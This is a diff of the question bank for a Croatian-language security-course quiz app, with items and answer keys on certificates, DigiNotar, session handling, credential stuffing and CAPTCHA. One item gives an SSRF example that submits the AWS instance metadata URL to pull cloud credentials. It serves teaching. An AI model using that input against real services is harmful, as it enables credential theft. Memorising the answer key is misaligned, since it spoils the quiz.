   },
   {
     topic: "PKI & Certifikati",
-    q: "Poslužitelj na www.fer.hr koristi identičan certifikat kao www.fer.unizg.hr (za *.fer.unizg.hr). Preglednik prijavi TLS grešku. Zašto?",
+    q: "Napadač ima ispravan certifikat za www.fer.hr i odgovarajući privatni ključ. Što može napraviti?",
     answers: [
-      "Jer certifikat nije od pouzdanog CA",
-      "Jer Subject (*.fer.unizg.hr) ne odgovara domeni www.fer.hr — mismatch između certifikata i naziva poslužitelja",
-      "Jer certifikat je istekao",
-      "Jer se isti certifikat ne smije koristiti na dva poslužitelja"
+      "Ništa — TLS šifrira promet pa ga ne može čitati",
+      "Izvesti napad čovjeka u sredini (MitM) — korisnik ne može razlikovati napadača od pravog poslužitelja",
+      "Samo prikupiti metapodatke o prometu, ne sadržaj",
+      "Napasti samo korisnike koji ne koriste HTTPS"
     ],
     correct: 1,
-    explanation: "TLS provjera: certifikat mora biti izdan za domenu kojoj pristupamo. *.fer.unizg.hr pokriva samo poddomene od fer.unizg.hr (npr. www.fer.unizg.hr), ali NE i fer.hr ili www.fer.hr — potpuno različita domena."
+    explanation: "Iz predavanja: 'Ako napadač ima ispravan certifikat za www.fer.hr i odgovarajući privatni ključ, onda korisnik ne može znati razgovara li s napadačem ili sa FER-ovim poslužiteljem!' — klasični MitM napad uz lažni certifikat."
   },
   {
     topic: "PKI & Certifikati",
-    q: "Mirko gradi sustav kriptiranja s ci = mi XOR RSA(pk, iv+i) bez MAC-a. Pruža li ovo povjerljivost?",
+    q: "Slučaj DigiNotar: CA je izdao lažne certifikate za google.com. Što se dogodilo s DigiNotar-om?",
     answers: [
-      "Da, RSA je siguran asimetrični algoritam",
-      "Ne — RSA je deterministički, pa isti iv+i uvijek daje isti RSA(pk, iv+i), a ECB-like napad otkriva obrasce. Uz to, bez MAC-a nema zaštite integriteta",
-      "Da, ali samo za kratke poruke",
-      "Ne, jer iv mora biti tajan"
+      "Platilo je globu i nastavilo s radom uz nadzor",
+      "Uklonjen je s liste vršnih certifikata u preglednicima i uskoro bankrotirao",
+      "Certifikati su povučeni ali CA je nastavio raditi",
+      "Google je tužio DigiNotar i dobio naknadu štete"
     ],
     correct: 1,
-    explanation: "RSA bez randomiziranog paddinga je deterministički — isti ulaz daje isti izlaz. Budući da iv+i je predvidljiv, keystream je isti za svako slanje pa je ranjivo na ECB-like pattern napade. Bez MAC-a, napadač može i modificirati poruku."
+    explanation: "Iz predavanja: DigiNotar je uklonjen s liste vršnih CA-ova u svim preglednicima. Bez tog povjerenja CA ne može funkcionirati — uskoro je bankrotirao. Primjer koliko je katastrofalna kompromitacija CA-a."
+  },
+  {
+    topic: "PKI & Certifikati",
+    q: "Polje 'X509v3 Extended Key Usage: TLS Web Server Authentication' u certifikatu govori:",
+    answers: [
+      "Da se certifikat može koristiti za bilo koju kriptografsku svrhu",
+      "Da je certifikat namijenjen specifično za autentifikaciju TLS poslužitelja — ograničava namjenu ključa",
+      "Da je certifikat izdan samo za web promet, ne za email",
+      "Da certifikat koristi prošireni 4096-bitni ključ"
+    ],
+    correct: 1,
+    explanation: "Extended Key Usage ograničava namjenu certifikata. 'TLS Web Server Authentication' znači da se certifikat smije koristiti za autentifikaciju poslužitelja u TLS. Certifikat ne smije se koristiti za potpisivanje koda ili emailova."
   },
 
-  // ── ZLOĆUDNI KOD (dodatna) ───────────────────────────────────────────────────
+  // ══════════════════════════════════════════════════════════════
+  // EXTRA — WEB SIGURNOST (dodatnih 9)
+  // ══════════════════════════════════════════════════════════════
   {
-    topic: "Zloćudni kod",
-    q: "Koji zloćudni kod ne radi sam zloćudnu funkcionalnost već samo preuzima i instalira drugi maliciozni kod?",
-    answers: ["Virus", "Dropper", "Downloader", "Spyware"],
-    correct: 2,
-    explanation: "Downloader: preuzima drugi maliciozni kod s mreže. Dropper: sadrži maliciozni kod u sebi i 'ispušta' ga na disk. GuLoader je primjer downloadera — sam ne radi štetu, samo preuzima i pokreće NetWire-RAT."
-  },
-  {
-    topic: "Zloćudni kod",
-    q: "Što je logička bomba (logic bomb)?",
+    topic: "Web sigurnost",
+    q: "Zašto reflektirani XSS NIJE prikladan za krađu session identifikatora kao pohranjeni XSS?",
     answers: [
-      "Zloćudni kod koji se širi eksponencijalno po mreži",
-      "Kod koji obavlja zloćudnu funkcionalnost tek nakon što se ispune određeni uvjeti — do tada je potpuno neprimjetan",
-      "Virus koji briše sve datoteke odmah po instalaciji",
-      "Ransomware koji se aktivira ako korisnik ne plati u roku"
+      "Jer reflektirani XSS ne može pristupiti document.cookie",
+      "Jer korisnik mora kliknuti na specifičnu malicioznu poveznicu — napadač mora privući žrtvu, društveni inženjering je potreban",
+      "Jer reflektirani XSS ne radi u modernim preglednicima",
+      "Jer reflektirani XSS može ukrasti samo lozinku, ne session token"
     ],
     correct: 1,
-    explanation: "Logička bomba ostaje dormantna dok se ne ispune definirani uvjeti (datum, broj dana, određena radnja korisnika). Primjer: zaposleniku se otpusti, a bomba se aktivira i briše podatke 30 dana nakon otpuštanja."
+    explanation: "Iz predavanja: 'reflektirani XSS nam nije (toliko) prikladan za krađu sjednice zato što korisnici moraju kliknuti na poveznicu.' Pohranjeni XSS napada svakog posjetitelja automatski — bez ikakve interakcije žrtve."
   },
   {
-    topic: "Zloćudni kod",
-    q: "Koja je ključna razlika između virusa i crva?",
+    topic: "Web sigurnost",
+    q: "Koja je OWASP preporuka za generiranje session identifikatora?",
     answers: [
-      "Virus napada sustav, crv napada mrežu",
-      "Virus se širi ubacivanjem u legalne datoteke i treba vektor, crv se širi samostalno mrežom bez vektora",
-      "Crv šifrira podatke, virus ih briše",
-      "Virus je stariji pojam za ono što danas zovemo crv"
+      "Trebaju biti kratki i numerički za lakše upravljanje",
+      "Trebaju biti dovoljno dugački, potpuno nasumični, visoke entropije i neovisni o korisničkim podacima",
+      "Trebaju sadržavati korisničko ime i timestamp za lakše debuggiranje",
+      "Trebaju se generirati na klijentskoj strani radi brzine"
     ],
     correct: 1,
-    explanation: "Virus: ubacuje kopiju sebe u legalne izvršne datoteke i širi se kad korisnik pokrene zaraženi program. Crv: nema potrebe za domaćinom, širi se autonomno mrežom iskorištavajući ranjivosti."
+    explanation: "Session ID: mora biti nasumičan (nepredvidljiv), dovoljno dugačak (visoka entropija) da se ne može pogoditi brute forceom, i potpuno neovisan o korisničkim podacima (korisničko ime, IP...). Predvidljivi session IDevi su česta ranjivost."
   },
   {
-    topic: "Zloćudni kod",
-    q: "Botnet se može koristiti za upravljanje putem Twitter-a. Je li to točno i zašto?",
+    topic: "Web sigurnost",
+    q: "Što se mora uraditi sa session ID-em kada korisnik klikne 'Odjava' (logout)?",
     answers: [
-      "Ne, botneti koriste samo IRC protokol",
-      "Da, botmaster može slati naredbe kroz javne Twitter objave koje botovi čitaju i interpretiraju",
-      "Ne, Twitter blokira sve botnet komunikacije",
-      "Da, ali samo za DDoS napade"
+      "Session ID se sprema za sljedeću prijavu radi brzine",
+      "Session ID se mora uništiti/invalidirati na poslužitelju — odjava mora poništiti sve podatke o sjednici",
+      "Session ID se mijenja u novi ali stari ostaje aktivan 30 minuta",
+      "Session ID se briše samo na klijentskoj strani (iz kolačića)"
     ],
     correct: 1,
-    explanation: "Botneti mogu koristiti bilo koji javni komunikacijski kanal kao C&C — Twitter, Reddit, Google Docs, pa čak i blockchain. Botmaster objavi šifriranu naredbu, botovi je čitaju i izvršavaju. Teško je blokirati jer se koristi legalna infrastruktura."
+    explanation: "Iz predavanja: 'provjeriti da odjava uništava sve podatke o sjednici.' Brisanje kolačića na klijentskoj strani nije dovoljno — stari session ID mora biti invalidiran i na poslužitelju, inače ga napadač koji ga je ukrao može i dalje koristiti."
   },
   {
-    topic: "Zloćudni kod",
-    q: "Koji je najefikasniji način zaštite od ransomwarea koji šifrira podatke?",
+    topic: "Web sigurnost",
+    q: "Loša poruka o grešci pri prijavi: 'Korisničko ime nije ispravno.' Zašto je ovo sigurnosni propust?",
     answers: [
-      "Instalacija antivirus softvera najnovije verzije",
-      "Redoviti offline backup podataka — napadač može šifrirati diskove, ali ne i backup koji nije priključen",
-      "Korištenje Linux umjesto Windows OS-a",
-      "Plaćanje otkupnine odmah da se ne gubi vremena"
+      "Nije propust — korisnici trebaju znati što su pogriješili",
+      "Napadač može enumarirati korisnička imena — zna razliku između nepostojećeg korisnika i pogrešne lozinke",
+      "Poruka je predugi i otkriva previše o sustavu",
+      "Samo ako se ne koristi HTTPS"
     ],
     correct: 1,
-    explanation: "Najefikasnija zaštita od ransomwarea je offline backup — ako napadač šifrira sve diskove na mreži, backup koji nije priključen ostaje netaknut. Antivirusi ne mogu uhvatiti svaki novi ransomware (zero-day varijante)."
-  },
-
-  // ── AUTENTIFIKACIJA (dodatna) ────────────────────────────────────────────────
-  {
-    topic: "Autentifikacija & Autorizacija",
-    q: "Što je online vs offline napad pogađanjem lozinke?",
-    answers: [
-      "Online = napad s interneta, offline = napad iz lokalne mreže",
-      "Online = napadač pokušava login direktno na sustav; offline = napadač ima kopiju hash-eva i pogađa lokalno bez ograničenja",
-      "Online napad je uvijek brži od offline napada",
-      "Nema razlike u tehnici — samo u lokaciji napadača"
-    ],
-    correct: 1,
-    explanation: "Online napad je spor (rate limiting, lockout). Offline napad je puno opasniji — napadač ima hash datoteku i može isprobati milijarde kombinacija u sekundi lokalno, bez ikakvih ograničenja sustava."
+    explanation: "Iz predavanja: nikad ne pisati je li pogrešno korisničko ime ILI lozinka — napadač koristi tu informaciju za username enumeration. Ispravna poruka: 'Korisničko ime ili lozinka su neispravni' — bez detalja."
   },
   {
-    topic: "Autentifikacija & Autorizacija",
-    q: "Pametna kartica je primjer koje vrste autentifikacije?",
+    topic: "Web sigurnost",
+    q: "Što su tokeni (access/refresh tokeni) kao alternativa session ID kolačićima?",
     answers: [
-      "Jednofaktorska — ono što imaš",
-      "Dvofaktorska — ono što imaš (kartica) + ono što znaš (PIN)",
-      "Višefaktorska — kartica, PIN i biometrija",
-      "Jednofaktorska — ono što znaš"
+      "Tokeni su kriptirani session ID-evi",
+      "Kratkotrajan access token za autorizaciju i dugotrajniji refresh token za obnavljanje — manje dugotrajna izloženost od session ID-eva",
+      "Tokeni su jednokratne lozinke za 2FA",
+      "Tokeni su RSA ključevi za svaki HTTP zahtjev"
     ],
     correct: 1,
-    explanation: "Pametna kartica kombinira dva faktora: što imaš (fizička kartica) i što znaš (PIN). To je dvofaktorska autentifikacija. Primjeri: bankovne kartice, osobne iskaznice, FIDO2 security keys."
+    explanation: "Tokeni imaju kraće trajanje od klasičnih session ID-eva — manja šteta ako su ukradeni. Access token je kratkotrajan (minutama), refresh token dugotrajan ali se koristi samo za obnavljanje access tokena. JWT je popularan format."
   },
   {
-    topic: "Autentifikacija & Autorizacija",
-    q: "Koja je dobra praksa kada korisnik pogriješi lozinku ili korisničko ime pri prijavi?",
+    topic: "Web sigurnost",
+    q: "Napadač koristi isti korisničke podatke ukradene s jedne web aplikacije na drugoj. Kako se ta tehnika zove i kako se obraniti?",
     answers: [
-      "Reći korisniku je li pogrešno korisničko ime ili lozinka da zna što ispraviti",
-      "Prikazati samo generičku poruku: 'Korisničko ime ili lozinka su neispravni'",
-      "Blokirati račun odmah nakon prve greške",
-      "Poslati korisniku email s podsjetnikom na lozinku"
+      "Phishing — obrana: edukacija korisnika",
+      "Credential stuffing — obrana: MFA i detekcija masovnih prijava s nepoznatih lokacija",
+      "Brute force — obrana: CAPTCHA i lockout",
+      "Session hijacking — obrana: HTTPOnly kolačići"
     ],
     correct: 1,
-    explanation: "Nikad ne otkrivaj je li pogrešno korisničko ime ILI lozinka — napadač bi mogao koristiti tu informaciju za enumeraciju korisnika (username enumeration). Uvijek prikaži generičku poruku."
+    explanation: "Credential stuffing: napadač automatski isprobava ukradene par (korisničko ime + lozinka) na stotine različitih web aplikacija. Obrana: MFA (čak i s ispravnom lozinkom), monitoring neobičnih prijava, rate limiting."
+  },
+  {
+    topic: "Web sigurnost",
+    q: "CAPTCHA se koristi kao zaštita od čega u kontekstu web autentifikacije?",
+    answers: [
+      "XSS napada koji automatski kradu session tokene",
+      "Automatiziranih bot napada (brute force lozinki, credential stuffing) — razlikuje ljude od automatiziranih programa",
+      "SQL injection napada na login formu",
+      "CSRF napada na login endpoint"
+    ],
+    correct: 1,
+    explanation: "CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart): sprečava automatizirane alate od pogađanja lozinki ili masovnih prijava. Botovi ne mogu lako riješiti vizualne ili kognitivne izazove."
+  },
+  {
+    topic: "Web sigurnost",
+    q: "Što znači 'stateless' (bez stanja) u kontekstu HTTP protokola i zašto je to problem za autentifikaciju?",
+    answers: [
+      "HTTP šifrira svaki zahtjev zasebno — problem je ključna razmjena",
+      "HTTP ne pamti prethodni zahtjev — bez dodatnog mehanizma (session, token) poslužitelj ne zna je li korisnik već prijavljen",
+      "HTTP nema mehanizam za provjeru integriteta zahtjeva",
+      "HTTP zahtijeva novu TCP konekciju za svaki zahtjev"
+    ],
+    correct: 1,
+    explanation: "HTTP je stateless: svaki zahtjev je neovisan, poslužitelj ne pamti prethodne. Za autentifikaciju je potreban mehanizam stanja — session ID u kolačiću, JWT token ili skrivene varijable u formularu pamte 'tko sam ja'."
+  },
+  {
+    topic: "Web sigurnost",
+    q: "Napadač je registrirao web sjedište na portalu koji dohvaća metapodatke svih registriranih stranica. Kao URL prijavio je http://169.254.169.254/latest/meta-data/ (AWS metadata endpoint). Kakav je to napad?",
+    answers: [
+      "XSS — napadač ubacuje skriptu u metapodatke",
+      "SSRF — napadač navodi portal da dohvati interni AWS metadata endpoint i vrati mu cloud credentials",
+      "SQL injection u URL polju registracije",
+      "DNS cache poisoning napad"
+    ],
+    correct: 1,
+    explanation: "Klasični SSRF scenarij: portal dohvaća korisnikov URL sa svojih servera. 169.254.169.254 je AWS instance metadata endpoint dostupan samo s internih servera — sadrži IAM credentialse i konfiguracijske podatke. Napadač ih dobiva kroz portal kao posrednika."
   }
 ];
+
 
 // ── APP STATE ────────────────────────────────────────────────────────────────
 let questions = [];
 let current = 0;
 let score = 0;
 let answered = false;
-let count = 127;
+let count = 110;
 let shuffleQ = true;
 let shuffleA = true;
 let wrongAnswers = [];
